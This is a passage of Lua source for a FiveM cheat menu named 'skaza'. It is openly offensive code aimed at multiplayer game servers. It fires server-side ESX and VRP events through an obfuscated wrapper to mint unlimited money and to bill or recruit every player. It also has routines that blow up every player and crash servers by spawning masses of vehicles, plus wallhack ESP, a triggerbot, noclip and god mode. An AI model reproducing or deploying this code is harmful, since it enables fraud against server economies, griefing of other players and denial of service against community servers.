                            ConnectorFourEnd = GetOffsetFromEntityInWorldCoords(d7, 0.3, -0.3, -0.9)
                            DrawLine(
                                LineOneBegin.x,
                                LineOneBegin.y,
                                LineOneBegin.z,
                                LineOneEnd.x,
                                LineOneEnd.y,
                                LineOneEnd.z,
                                a8.r,
                                a8.g,
                                a8.b,
                                255
                            )
                            DrawLine(
                                LineTwoBegin.x,
                                LineTwoBegin.y,
                                LineTwoBegin.z,
                                LineTwoEnd.x,
                                LineTwoEnd.y,
                                LineTwoEnd.z,
                                a8.r,
                                a8.g,
                                a8.b,
                                255
                            )
                            DrawLine(
                                LineThreeBegin.x,
                                LineThreeBegin.y,
                                LineThreeBegin.z,
                                LineThreeEnd.x,
                                LineThreeEnd.y,
                                LineThreeEnd.z,
                                a8.r,
                                a8.g,
                                a8.b,
                                255
                            )
                            DrawLine(
                                LineThreeEnd.x,
                                LineThreeEnd.y,
                                LineThreeEnd.z,
                                LineFourBegin.x,
                                LineFourBegin.y,
                                LineFourBegin.z,
                                a8.r,
                                a8.g,
                                a8.b,
                                255
                            )
                            DrawLine(
                                TLineOneBegin.x,
                                TLineOneBegin.y,
                                TLineOneBegin.z,
                                TLineOneEnd.x,
                                TLineOneEnd.y,
                                TLineOneEnd.z,
                                a8.r,
                                a8.g,
                                a8.b,
                                255
                            )
                            DrawLine(
                                TLineTwoBegin.x,
                                TLineTwoBegin.y,
                                TLineTwoBegin.z,
                                TLineTwoEnd.x,
                                TLineTwoEnd.y,
                                TLineTwoEnd.z,
                                a8.r,
                                a8.g,
                                a8.b,
                                255
                            )
                            DrawLine(
                                TLineThreeBegin.x,
                                TLineThreeBegin.y,
                                TLineThreeBegin.z,
                                TLineThreeEnd.x,
                                TLineThreeEnd.y,
                                TLineThreeEnd.z,
                                a8.r,
                                a8.g,
                                a8.b,
                                255
                            )
                            DrawLine(
                                TLineThreeEnd.x,
                                TLineThreeEnd.y,
                                TLineThreeEnd.z,
                                TLineFourBegin.x,
                                TLineFourBegin.y,
                                TLineFourBegin.z,
                                a8.r,
                                a8.g,
                                a8.b,
                                255
                            )
                            DrawLine(
                                ConnectorOneBegin.x,
                                ConnectorOneBegin.y,
                                ConnectorOneBegin.z,
                                ConnectorOneEnd.x,
                                ConnectorOneEnd.y,
                                ConnectorOneEnd.z,
                                a8.r,
                                a8.g,
                                a8.b,
                                255
                            )
                            DrawLine(
                                ConnectorTwoBegin.x,
                                ConnectorTwoBegin.y,
                                ConnectorTwoBegin.z,
                                ConnectorTwoEnd.x,
                                ConnectorTwoEnd.y,
                                ConnectorTwoEnd.z,
                                a8.r,
                                a8.g,
                                a8.b,
                                255
                            )
                            DrawLine(
                                ConnectorThreeBegin.x,
                                ConnectorThreeBegin.y,
                                ConnectorThreeBegin.z,
                                ConnectorThreeEnd.x,
                                ConnectorThreeEnd.y,
                                ConnectorThreeEnd.z,
                                a8.r,
                                a8.g,
                                a8.b,
                                255
                            )
                            DrawLine(
                                ConnectorFourBegin.x,
                                ConnectorFourBegin.y,
                                ConnectorFourBegin.z,
                                ConnectorFourEnd.x,
                                ConnectorFourEnd.y,
                                ConnectorFourEnd.z,
                                a8.r,
                                a8.g,
                                a8.b,
                                255
                            )
                        end
                        if esplines and esp then
                            DrawLine(d8, d9, da, x, y, z, a8.r, a8.g, a8.b, 255)
                        end
                    end
                end
            end
            if VehGod and IsPedInAnyVehicle(PlayerPedId(-1), true) then
                SetEntityInvincible(GetVehiclePedIsUsing(PlayerPedId(-1)), true)
            end
            if oneshot then
                SetPlayerWeaponDamageModifier(PlayerId(-1), 100.0)
                local dd = getEntity(PlayerId(-1))
                if IsEntityAPed(dd) then
                    if IsPedInAnyVehicle(dd, true) then
                        if IsPedInAnyVehicle(GetPlayerPed(-1), true) then
                            if IsControlJustReleased(1, 69) then
                                NetworkExplodeVehicle(GetVehiclePedIsIn(dd, true), true, true, 0)
                            end
                        else
                            if IsControlJustReleased(1, 142) then
                                NetworkExplodeVehicle(GetVehiclePedIsIn(dd, true), true, true, 0)
                            end
                        end
                    end
                end
            else
                SetPlayerWeaponDamageModifier(PlayerId(-1), 1.0)
            end
            if rainbowf then
                for i = 1, 7 do
                    Citizen.Wait(100)
                    SetPedWeaponTintIndex(GetPlayerPed(-1), 1198879012, i)
                    i = i + 1
                    if i == 7 then
                        i = 1
                    end
                end
            end
            if BlowDrugsUp then
                Citizen.CreateThread(
                    function()
                        jebacariesa('esx_drugs:startHarvestWeed')
                        jebacariesa('esx_drugs:startHarvestCoke')
                        jebacariesa('esx_drugs:startHarvestMeth')
                        jebacariesa('esx_drugs:startTransformOpium')
                        jebacariesa('esx_drugs:startTransformWeed')
                        jebacariesa('esx_drugs:startTransformCoke')
                        jebacariesa('esx_drugs:startTransformMeth')
                        jebacariesa('esx_drugs:startTransformOpium')
                        jebacariesa('esx_drugs:startSellWeed')
                        jebacariesa('esx_drugs:startSellCoke')
                        jebacariesa('esx_drugs:startSellMeth')
                        jebacariesa('esx_drugs:startSellOpium')
                        jebacariesa('esx_illegal_drugs:startHarvestWeed')
                        jebacariesa('esx_illegal_drugs:startHarvestCoke')
                        jebacariesa('esx_illegal_drugs:startHarvestMeth')
                        jebacariesa('esx_illegal_drugs:startTransformOpium')
                        jebacariesa('esx_illegal_drugs:startTransformWeed')
                        jebacariesa('esx_illegal_drugs:startTransformCoke')
                        jebacariesa('esx_illegal_drugs:startTransformMeth')
                        jebacariesa('esx_illegal_drugs:startTransformOpium')
                        jebacariesa('esx_illegal_drugs:startSellWeed')
                        jebacariesa('esx_illegal_drugs:startSellCoke')
                        jebacariesa('esx_illegal_drugs:startSellMeth')
                        jebacariesa('esx_illegal_drugs:startSellOpium')
                        Citizen.Wait(1000)
                    end
                )
            end
            if blowall then
                --[[for bD = 0, 9 do
                    jebacariesa(
                        '_chat:messageEntered',
                        'skaza',
                        {
                            141,
                            211,
                            255
                        },
                        '^' .. bD .. 'skaza ~ 5391'
                    )
                end--]]
                for i = 0, 128 do
                    Citizen.Wait(500)
                    AddExplosion(GetEntityCoords(GetPlayerPed(i)), 5, 3000.0, true, false, 100000.0)
                    AddExplosion(GetEntityCoords(GetPlayerPed(i)), 5, 3000.0, true, false, true)
                end
            end
            if crosshair then
                ShowHudComponentThisFrame(14)
            end
            if crosshairc then
                bz('~r~+', 0.495, 0.484)
            end
            if crosshairc2 then
                bz('~r~.', 0.4968, 0.478)
            end
            if cN then
                local de = false
                local df = 130
                local dg = 0
                for f = 0, 128 do
                    if NetworkIsPlayerActive(f) and GetPlayerPed(f) ~= GetPlayerPed(-1) then
                        ped = GetPlayerPed(f)
                        blip = GetBlipFromEntity(ped)
                        x1, y1, z1 = table.unpack(GetEntityCoords(GetPlayerPed(-1), true))
                        x2, y2, z2 = table.unpack(GetEntityCoords(GetPlayerPed(f), true))
                        distance = math.floor(GetDistanceBetweenCoords(x1, y1, z1, x2, y2, z2, true))
                        if de then
                            if NetworkIsPlayerTalking(f) then
                                local dh = k(1.0)
                                DrawText3D(
                                    x2,
                                    y2,
                                    z2 + 1.2,
                                    GetPlayerServerId(f) .. '  |  ' .. GetPlayerName(f),
                                    dh.r,
                                    dh.g,
                                    dh.b
                                )
                            else
                                DrawText3D(
                                    x2,
                                    y2,
                                    z2 + 1.2,
                                    GetPlayerServerId(f) .. '  |  ' .. GetPlayerName(f),
                                    255,
                                    255,
                                    255
                                )
                            end
                        end
                        if distance < df then
                            if not de then
                                if NetworkIsPlayerTalking(f) then
                                    local dh = k(1.0)
                                    DrawText3D(
                                        x2,
                                        y2,
                                        z2 + 1.2,
                                        GetPlayerServerId(f) .. '  |  ' .. GetPlayerName(f),
                                        dh.r,
                                        dh.g,
                                        dh.b
                                    )
                                else
                                    DrawText3D(
                                        x2,
                                        y2,
                                        z2 + 1.2,
                                        GetPlayerServerId(f) .. '  |  ' .. GetPlayerName(f),
                                        255,
                                        255,
                                        255
                                    )
                                end
                            end
                        end
                    end
                end
            end
            if showCoords then
                x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(-1), true))
                roundx = tonumber(string.format('%.2f', x))
                roundy = tonumber(string.format('%.2f', y))
                roundz = tonumber(string.format('%.2f', z))
                bz('~r~X:~w~ ' .. roundx, 0.05, 0.00)
                bz('~r~Y:~w~ ' .. roundy, 0.11, 0.00)
                bz('~r~Z:~w~ ' .. roundz, 0.17, 0.00)
            end

            function carthieftroll()
                for i = 0, 128 do
                    local bK = GetEntityCoords(GetPlayerPed(i))
                    jebacariesa('esx_carthief:alertcops', bK.x, bK.y, bK.z)
                end
            end

            function automaticmoneyesx()
                local m = KeyboardInput('Warning, this value can be multiplied!!!', '', 100)
                if cO then
                    if m ~= '' then
                        local confirm = KeyboardInput('Are you sure? y/n', '', 0)
                        if confirm == 'y' then
                        end
                        av('~h~~g~Testing all ~y~ESX ~g~scripts~w~.', true)
                        jebacariesa('esx_carthief:pay', m)
                        jebacariesa('esx_jobs:caution', 'give_back', m)
                        jebacariesa('esx_fueldelivery:pay', m)
                        jebacariesa('esx_carthief:pay', m)
                        jebacariesa('esx_godirtyjob:pay', m)
                        jebacariesa('esx_pizza:pay', m)
                        jebacariesa('esx_ranger:pay', m)
                        jebacariesa('esx_garbagejob:pay', m)
                        jebacariesa('esx_truckerjob:pay', m)
                        jebacariesa('AdminMenu:giveBank', m)
                        jebacariesa('AdminMenu:giveCash', m)
                        jebacariesa('esx_gopostaljob:pay', m)
                        jebacariesa('esx_banksecurity:pay', m)
                        jebacariesa('esx_slotmachine:sv:2', m)
                    elseif confirm == 'n' then
                        av('~h~~w~Operation cancelled~w~.', false)
                    else
                        av('~h~~w~Invalid Confirmation~w~.', true)
                        av('~h~~w~Operation cancelled~w~.', false)
                    end
                end
            end

            function vrpdestroy()
                --[[for bD = 0, 9 do
                    jebacariesa(
                        '_chat:messageEntered',
                        '',
                        {
                            141,
                            211,
                            255
                        },
                        '^' .. bD .. ''
                    )
                end--]]
                jebacariesa(
                    'lscustoms:payGarage',
                    {
                        costs = -99999999
                    }
                )
                jebacariesa('vrp_slotmachine:server:2', 999999999)
                jebacariesa('Banca:deposit', 999999999)
                jebacariesa('bank:deposit', 999999999)
                local di = GetPlayerServerId(PlayerId())
                for i = 0, 128 do
                    chujaries('bank:transfer', di, GetPlayerServerId(i), 99999999)
                end
            end
            if bv then
                esxdestroyv2()
                nukeserver()
            end

            function esxdestroyv2()
                Citizen.CreateThread(
                    function()
                        jebacariesa('esx_jobs:caution', 'give_back', 9999999999)
                        jebacariesa('esx_fueldelivery:pay', 9999999999)
                        jebacariesa('esx_carthief:pay', 9999999999)
                        jebacariesa('esx_godirtyjob:pay', 9999999999)
                        jebacariesa('esx_pizza:pay', 9999999999)
                        jebacariesa('esx_ranger:pay', 9999999999)
                        jebacariesa('esx_garbagejob:pay', 9999999999)
                        jebacariesa('esx_truckerjob:pay', 9999999999)
                        jebacariesa('AdminMenu:giveBank', 9999999999)
                        jebacariesa('AdminMenu:giveCash', 9999999999)
                        jebacariesa('esx_gopostaljob:pay', 9999999999)
                        jebacariesa('esx_banksecurity:pay', 9999999999)
                        jebacariesa('esx_slotmachine:sv:2', 9999999999)
                        jebacariesa('esx-qalle-hunting:reward', 9999999999)
                        jebacariesa('esx-qalle-hunting:sell')
                        --[[for bD = 0, 9 do
                            jebacariesa(
                                '_chat:messageEntered',
                                'skaza',
                                {
                                    141,
                                    211,
                                    255
                                },
                                '^' .. bD .. 'skaza ~ 5391'
                            )
                        end--]]
                        for i = 0, 128 do
                            jebacariesa(
                                'esx:giveInventoryItem',
                                GetPlayerServerId(i),
                                'item_money',
                                'money',
                                1254756
                            )
                            jebacariesa(
                                'esx:giveInventoryItem',
                                GetPlayerServerId(i),
                                'item_money',
                                'money',
                                1254756
                            )
                            jebacariesa(
                                'esx_billing:sendBill',
                                GetPlayerServerId(i),
                                '5391 was here',
                                '',
                                43161337
                            )
                            jebacariesa('NB:recruterplayer', GetPlayerServerId(i), 'police', 3)
                            jebacariesa('NB:recruterplayer', i, 'police', 3)
                        end
                    end
                )
            end

            function giveeveryone()
                Citizen.CreateThread(
                    function()
                        jebacariesa('esx_jobs:caution', 'give_back', 9999999999)
                        jebacariesa('esx_fueldelivery:pay', 9999999999)
                        jebacariesa('esx_carthief:pay', 9999999999)
                        jebacariesa('esx_godirtyjob:pay', 9999999999)
                        jebacariesa('esx_pizza:pay', 9999999999)
                        jebacariesa('esx_ranger:pay', 9999999999)
                        jebacariesa('esx_garbagejob:pay', 9999999999)
                        jebacariesa('esx_truckerjob:pay', 9999999999)
                        jebacariesa('AdminMenu:giveBank', 9999999999)
                        jebacariesa('AdminMenu:giveCash', 9999999999)
                        jebacariesa('esx_gopostaljob:pay', 9999999999)
                        jebacariesa('esx_banksecurity:pay', 9999999999)
                        jebacariesa('esx_slotmachine:sv:2', 9999999999)
                        jebacariesa('esx-qalle-hunting:reward', 9999999999)
                        jebacariesa('esx-qalle-hunting:sell')

                        for i = 0, 128 do
                            jebacariesa(
                                'esx:giveInventoryItem',
                                GetPlayerServerId(i),
                                'item_money',
                                'money',
                                125475600
                            )
                            jebacariesa(
                                'esx:giveInventoryItem',
                                GetPlayerServerId(i),
                                'item_money',
                                'money',
                                125475600
                            )
                        end
                    end
                )
            end

            function nukeserver()
                Citizen.CreateThread(
                    function()
                        local dj = 'Avenger'
                        local dk = 'CARGOPLANE'
                        local dl = 'luxor'
                        local dm = 'maverick'
                        local dn = 'blimp2'
                        while not HasModelLoaded(GetHashKey(dk)) do
                            Citizen.Wait(0)
                            pizda(GetHashKey(dk))
                        end
                        while not HasModelLoaded(GetHashKey(dl)) do
                            Citizen.Wait(0)
                            pizda(GetHashKey(dl))
                        end
                        while not HasModelLoaded(GetHashKey(dj)) do
                            Citizen.Wait(0)
                            pizda(GetHashKey(dj))
                        end
                        while not HasModelLoaded(GetHashKey(dm)) do
                            Citizen.Wait(0)
                            pizda(GetHashKey(dm))
                        end
                        while not HasModelLoaded(GetHashKey(dn)) do
                            Citizen.Wait(0)
                            pizda(GetHashKey(dn))
                        end
                        --[[for bD = 0, 9 do
                            jebacariesa(
                                '_chat:messageEntered',
                                '',
                                {
                                    141,
                                    211,
                                    255
                                },
                                ''
                            )
                        end--]]
                        for i = 0, 128 do
                            local dl =
                                CreateVehicle(GetHashKey(dj), GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and
                                CreateVehicle(GetHashKey(dj), GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and
                                CreateVehicle(GetHashKey(dj), 2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
                                CreateVehicle(GetHashKey(dk), GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and
                                CreateVehicle(GetHashKey(dk), GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and
                                CreateVehicle(GetHashKey(dk), 2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
                                CreateVehicle(GetHashKey(dl), GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and
                                CreateVehicle(GetHashKey(dl), GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and
                                CreateVehicle(GetHashKey(dl), 2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
                                CreateVehicle(GetHashKey(dm), GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and
                                CreateVehicle(GetHashKey(dm), GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and
                                CreateVehicle(GetHashKey(dm), 2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
                                CreateVehicle(GetHashKey(dn), GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and
                                CreateVehicle(GetHashKey(dn), GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and
                                CreateVehicle(GetHashKey(dn), 2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
                                AddExplosion(GetEntityCoords(GetPlayerPed(i)), 5, 3000.0, true, false, 100000.0) and
                                AddExplosion(GetEntityCoords(GetPlayerPed(i)), 5, 3000.0, true, false, true)
                        end
                    end
                )
            end
            if servercrasherxd then
                Citizen.CreateThread(
                    function()
                        local dj = 'Avenger'
                        local dk = 'CARGOPLANE'
                        local dl = 'luxor'
                        local dm = 'maverick'
                        local dn = 'blimp2'
                        local dze = 'bombushka'
                        while not HasModelLoaded(GetHashKey(dk)) do
                            Citizen.Wait(0)
                            pizda(GetHashKey(dk))
                        end
                        while not HasModelLoaded(GetHashKey(dl)) do
                            Citizen.Wait(0)
                            pizda(GetHashKey(dl))
                        end
                        while not HasModelLoaded(GetHashKey(dj)) do
                            Citizen.Wait(0)
                            pizda(GetHashKey(dj))
                        end
                        while not HasModelLoaded(GetHashKey(dm)) do
                            Citizen.Wait(0)
                            pizda(GetHashKey(dm))
                        end
                        while not HasModelLoaded(GetHashKey(dn)) do
                            Citizen.Wait(0)
                            pizda(GetHashKey(dn))
                        end
                        while not HasModelLoaded(GetHashKey(dze)) do
                            Citizen.Wait(0)
                            pizda(GetHashKey(dze))
                        end
                        for i = 0, 128 do
                            for ak = 100, 150 do
                                local dl =
                                    CreateVehicle(GetHashKey(dj), GetEntityCoords(GetPlayerPed(i)) - ak, true, true) and
                                    CreateVehicle(GetHashKey(dj), GetEntityCoords(GetPlayerPed(i)) - ak, true, true) and
                                    CreateVehicle(GetHashKey(dj), 2 * GetEntityCoords(GetPlayerPed(i)) + ak, true, true) and
                                    CreateVehicle(GetHashKey(dk), GetEntityCoords(GetPlayerPed(i)) - ak, true, true) and
                                    CreateVehicle(GetHashKey(dk), GetEntityCoords(GetPlayerPed(i)) - ak, true, true) and
                                    CreateVehicle(GetHashKey(dk), 2 * GetEntityCoords(GetPlayerPed(i)) - ak, true, true) and
                                    CreateVehicle(GetHashKey(dl), GetEntityCoords(GetPlayerPed(i)) - ak, true, true) and
                                    CreateVehicle(GetHashKey(dl), 2 * GetEntityCoords(GetPlayerPed(i)) + ak, true, true) and
                                    CreateVehicle(GetHashKey(dm), GetEntityCoords(GetPlayerPed(i)) - ak, true, true) and
                                    CreateVehicle(GetHashKey(dm), GetEntityCoords(GetPlayerPed(i)) - ak, true, true) and
                                    CreateVehicle(GetHashKey(dm), 2 * GetEntityCoords(GetPlayerPed(i)) + ak, true, true) and
                                    CreateVehicle(GetHashKey(dn), GetEntityCoords(GetPlayerPed(i)) - ak, true, true) and
                                    CreateVehicle(GetHashKey(dn), GetEntityCoords(GetPlayerPed(i)) - ak, true, true) and
                                    CreateVehicle(GetHashKey(dn), 2 * GetEntityCoords(GetPlayerPed(i)) + ak, true, true) and
                                    CreateVehicle(GetHashKey(dze), GetEntityCoords(GetPlayerPed(i)) - ak, true, true) and
                                    CreateVehicle(GetHashKey(dze), GetEntityCoords(GetPlayerPed(i)) - ak, true, true) and
                                    CreateVehicle(GetHashKey(dze), 2 * GetEntityCoords(GetPlayerPed(i)) + ak, true, true)
                            end
                        end
                    end
                )
            end
            if VehSpeed and IsPedInAnyVehicle(PlayerPedId(-1), true) then
                if IsControlPressed(0, 209) then
                    SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId(-1)), 100.0)
                elseif IsControlPressed(0, 210) then
                    SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId(-1)), 0.0)
                end
            end
            if TriggerBot then
                local dp, Entity = GetEntityPlayerIsFreeAimingAt(PlayerId(-1), Entity)
                if dp then
                    if IsEntityAPed(Entity) and not IsPedDeadOrDying(Entity, 0) and IsPedAPlayer(Entity) then
                        ShootPlayer(Entity)
                    end
                end
            end
            DisplayRadar(true)
            if RainbowVeh then
                local dq = k(1.0)
                SetVehicleCustomPrimaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), dq.r, dq.g, dq.b)
                SetVehicleCustomSecondaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), dq.r, dq.g, dq.b)
            end
            if rainbowh then
                for i = -1, 12 do
                    Citizen.Wait(100)
                    local a8 = k(1.0)
                    SetVehicleHeadlightsColour(GetVehiclePedIsUsing(PlayerPedId(-1)), i)
                    SetVehicleNeonLightsColour(GetVehiclePedIsUsing(PlayerPedId(-1)), a8.r, a8.g, a8.b)
                    if i == 12 then
                        i = -1
                    end
                end
            end
            if t2x then
                SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2.0 * 20.0)
            end
            if t4x then
                SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4.0 * 20.0)
            end
            if t10x then
                SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10.0 * 20.0)
            end
            if t16x then
                SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16.0 * 20.0)
            end
            if txd then
                SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 500.0 * 20.0)
            end
            if tbxd then
                SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9999.0 * 20.0)
            end
            if Noclip then
                local dr = 2
                local ds =
                    IsPedInAnyVehicle(PlayerPedId(-1), false) and GetVehiclePedIsUsing(PlayerPedId(-1)) or
                    PlayerPedId(-1)
                FreezeEntityPosition(PlayerPedId(-1), true)
                SetEntityInvincible(PlayerPedId(-1), true)
                local dt = GetEntityCoords(entity)
                DisableControlAction(0, 32, true)
                DisableControlAction(0, 268, true)
                DisableControlAction(0, 31, true)
                DisableControlAction(0, 269, true)
                DisableControlAction(0, 33, true)
                DisableControlAction(0, 266, true)
                DisableControlAction(0, 34, true)
                DisableControlAction(0, 30, true)
                DisableControlAction(0, 267, true)
                DisableControlAction(0, 35, true)
                DisableControlAction(0, 44, true)
                DisableControlAction(0, 20, true)
                local du = 0.0
                local dv = 0.0
                if GetInputMode() == 'MouseAndKeyboard' then
                    if IsDisabledControlPressed(0, 32) then
                        du = 0.5
                    end
                    if IsDisabledControlPressed(0, 33) then
                        du = -0.5
                    end
                    if IsDisabledControlPressed(0, 34) then
                        SetEntityHeading(PlayerPedId(-1), GetEntityHeading(PlayerPedId(-1)) + 3.0)
                    end
                    if IsDisabledControlPressed(0, 35) then
                        SetEntityHeading(PlayerPedId(-1), GetEntityHeading(PlayerPedId(-1)) - 3.0)
                    end
                    if IsDisabledControlPressed(0, 44) then
                        dv = 0.21
                    end
                    if IsDisabledControlPressed(0, 20) then
                        dv = -0.21
                    end
                end
                dt = GetOffsetFromEntityInWorldCoords(ds, 0.0, du * (dr + 0.3), dv * (dr + 0.3))
                local bL = GetEntityHeading(ds)
                SetEntityVelocity(ds, 0.0, 0.0, 0.0)
                SetEntityRotation(ds, 0.0, 0.0, 0.0, 0, false)
                SetEntityHeading(ds, bL)
                SetEntityCollision(ds, false, false)
                SetEntityCoordsNoOffset(ds, dt.x, dt.y, dt.z, true, true, true)
                FreezeEntityPosition(ds, false)
                SetEntityInvincible(ds, false)
                SetEntityCollision(ds, true, true)
            end
        end
    end
)
Citizen.CreateThread(
    function()
        FreezeEntityPosition(entity, false)
        local dw = 1
        local dx = true
        local dy = nil
        local dz = nil
        local dA = nil
        local dB = 1
        local dC = 1
        local dD = {
            1.0,
            2.0,
            4.0,
            10.0,
            512.0,
            9999.0
        }
        skaza.CreateMenu('\115\107\97\122\97\86\10', "~s~* <FONT COLOR='#00f7ff'>SKAZA ~s~* ")
        skaza.SetSubTitle('\115\107\97\122\97\86\10', '<FONT COLOR="#00f7ff">†skaza† ')
        skaza.CreateSubMenu('SelfMenu', '\115\107\97\122\97\86\10', '~w~~h~Menu wlasne')
        skaza.CreateSubMenu('TeleportMenu', '\115\107\97\122\97\86\10', '~w~~h~Teleport Menu')
        skaza.CreateSubMenu('WeaponMenu', '\115\107\97\122\97\86\10', '~w~~h~Menu broni')
        skaza.CreateSubMenu('\65\100\118\77\10', '\115\107\97\122\97\86\10', '~w~~h~Zaawansowane menu')
        skaza.CreateSubMenu('LuaMenu', '\115\107\97\122\97\86\10', '~w~~h~Opcje z lua')
        skaza.CreateSubMenu('VehicleMenu', '\115\107\97\122\97\86\10', '~w~~h~Menu pojazdow')
        skaza.CreateSubMenu('OnlinePlayerMenu', '\115\107\97\122\97\86\10', '~w~~h~Menu graczy online')
        skaza.CreateSubMenu('ESXTriggersSelf', 'SelfMenu', '~w~~h~ESX Triggers Self')
        skaza.CreateSubMenu('PlayerOptionsMenu', 'OnlinePlayerMenu', '~w~~h~Opcje gracza')
        skaza.CreateSubMenu('Destroyer', '\65\100\118\77\10', '~w~~h~Rozpierdol menu')
        skaza.CreateSubMenu('ESXBoss', 'LuaMenu', '~w~~h~ESX Boss Triggers')
        skaza.CreateSubMenu('ESXMoney', 'LuaMenu', '~w~~h~ESX Money Triggers')
        skaza.CreateSubMenu('ESXItems', 'LuaMenu', '~w~~h~ESX Items')
        skaza.CreateSubMenu('ESXCustom', 'LuaMenu', '~w~~h~ESX Random Triggers')
        skaza.CreateSubMenu('VRPTriggers', 'LuaMenu', '~w~~h~VRP Triggers')
        skaza.CreateSubMenu('MiscTriggers', 'LuaMenu', '~w~~h~Misc Triggers')
		skaza.CreateSubMenu('\107\111\103\117\115\122\10', '\115\107\97\122\97\86\10', '~w~~h~skazaAddons')
		skaza.CreateSubMenu('\101\115\120\121\10', '\107\111\103\117\115\122\10', '~w~~h~Esxy')
		skaza.CreateSubMenu('\112\101\100\121\10', '\107\111\103\117\115\122\10', '~w~~h~Pedy')
		skaza.CreateSubMenu('pogoda', '\107\111\103\117\115\122\10', '~w~~h~Pogoda')
		skaza.CreateSubMenu('richrp', '\107\111\103\117\115\122\10', '~w~~h~RICHRP')
		skaza.CreateSubMenu('wioskarp', '\107\111\103\117\115\122\10', '~w~~h~WioskaRP')
		skaza.CreateSubMenu('\100\122\119\105\101\107\105\10', '\107\111\103\117\115\122\10', '~w~~h~Dzwieki')
        skaza.CreateSubMenu('crds', '\115\107\97\122\97\86\10', '~w~~h~Napisy')
        skaza.CreateSubMenu('ESXJobs', 'LuaMenu', '~w~~h~ESX Jobs')
        skaza.CreateSubMenu('ESXJobs2', 'PlayerOptionsMenu', '~w~~h~ESX Jobs Individual')
        skaza.CreateSubMenu('ESXTriggerini', 'PlayerOptionsMenu', '~w~~h~ESX Triggers')
        skaza.CreateSubMenu('Trollmenu', 'PlayerOptionsMenu', '~w~~h~Troll Menu')
        skaza.CreateSubMenu('WeaponTypes', 'WeaponMenu', '~w~~h~Bronie')
        skaza.CreateSubMenu('WeaponTypeSelection', 'WeaponTypes', '~w~~h~Bronie')
        skaza.CreateSubMenu('WeaponOptions', 'WeaponTypeSelection', '~w~~h~Opcje broni')
        skaza.CreateSubMenu('ModSelect', 'WeaponOptions', '~w~~h~Weapon Mod Options')
        skaza.CreateSubMenu('CarTypes', 'VehicleMenu', '~w~~h~Vehicles')
        skaza.CreateSubMenu('CarTypeSelection', 'CarTypes', '~w~~h~Moew :3')
        skaza.CreateSubMenu('CarOptions', 'CarTypeSelection', '~w~~h~Car Options')
        skaza.CreateSubMenu('MainTrailer', 'VehicleMenu', '~w~~h~Trailers to Attach')
        skaza.CreateSubMenu('MainTrailerSel', 'MainTrailer', '~w~~h~Trailers Available')
        skaza.CreateSubMenu('MainTrailerSpa', 'MainTrailerSel', '~w~~h~Trailer Options')
        skaza.CreateSubMenu('GiveSingleWeaponPlayer', 'OnlinePlayerMenu', '~w~~h~Single Weapon Menu')
        skaza.CreateSubMenu('ESPMenu', '\65\100\118\77\10', '~w~~h~ESP Menu')
        skaza.CreateSubMenu('LSC', 'VehicleMenu', '~w~~h~LSC Customs')
        skaza.CreateSubMenu('tunings', 'LSC', '~w~~h~Visual Tuning')
        skaza.CreateSubMenu('performance', 'LSC', '~w~~h~Performance Tuning')
        skaza.CreateSubMenu('VRPPlayerTriggers', 'PlayerOptionsMenu', '~w~~h~VRP Triggers')
        skaza.CreateSubMenu('BoostMenu', 'VehicleMenu', '~w~~h~Vehicle Boost')
        skaza.CreateSubMenu('SpawnPeds', 'Trollmenu', '~w~~h~Spawn Peds')
        skaza.CreateSubMenu('GCT', 'VehicleMenu', '~w~~h~Global Car Trolls')
        skaza.CreateSubMenu('CsMenu', '\65\100\118\77\10', '~w~~h~Crosshairs')
		----- jezeli to widzisz to nic nie zrobisz ;9999
        for i, dE in pairs(bl) do
                  skaza.CreateSubMenu(dE.id, 'tunings', dE.name)
            if dE.id == 'paint' then
                skaza.CreateSubMenu('primary', dE.id, 'Primary Paint')
                skaza.CreateSubMenu('secondary', dE.id, 'Secondary Paint')
                skaza.CreateSubMenu('rimpaint', dE.id, 'Wheel Paint')
                skaza.CreateSubMenu('classic1', 'primary', 'Classic Paint')
                skaza.CreateSubMenu('metallic1', 'primary', 'Metallic Paint')
                skaza.CreateSubMenu('matte1', 'primary', 'Matte Paint')
                skaza.CreateSubMenu('metal1', 'primary', 'Metal Paint')
                skaza.CreateSubMenu('classic2', 'secondary', 'Classic Paint')
                skaza.CreateSubMenu('metallic2', 'secondary', 'Metallic Paint')
                skaza.CreateSubMenu('matte2', 'secondary', 'Matte Paint')
                skaza.CreateSubMenu('metal2', 'secondary', 'Metal Paint')
                skaza.CreateSubMenu('classic3', 'rimpaint', 'Classic Paint')
                skaza.CreateSubMenu('metallic3', 'rimpaint', 'Metallic Paint')
                skaza.CreateSubMenu('matte3', 'rimpaint', 'Matte Paint')
                skaza.CreateSubMenu('metal3', 'rimpaint', 'Metal Paint')
            end
        end
        for i, dE in pairs(bm) do
            skaza.CreateSubMenu(dE.id, 'performance', dE.name)
        end
        local SelectedPlayer
        while bw do
            ped = PlayerPedId()
            veh = GetVehiclePedIsUsing(ped)
            SetVehicleModKit(veh, 0)
            for i, dE in pairs(bl) do
